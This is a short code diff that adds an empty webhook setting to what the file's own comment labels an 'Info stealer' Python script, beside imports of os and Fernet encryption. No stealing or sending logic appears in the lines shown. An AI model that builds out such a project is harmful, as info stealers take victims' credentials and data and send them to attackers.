@@ -2,6 +2,9 @@
 import os
 from cryptography.fernet import Fernet
 
+# Settings
+webhook = ''
+
 ## Info stealer ##
 
 
